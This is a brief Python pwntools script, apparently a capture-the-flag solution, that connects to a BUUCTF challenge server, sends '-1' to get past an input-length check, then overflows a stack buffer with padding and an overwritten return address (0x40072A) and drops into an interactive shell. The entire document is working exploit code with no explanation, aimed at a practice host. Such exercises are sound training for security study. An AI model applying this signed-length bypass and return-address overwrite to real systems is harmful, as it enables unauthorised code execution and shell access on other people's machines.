from pwn import *

q = remote('node5.buuoj.cn',26629)

q.sendline('-1')

payload = b'a'*(0x10+8)+p64(0x040072A)

q.sendlineafter('u name?',payload)

q.interactive()
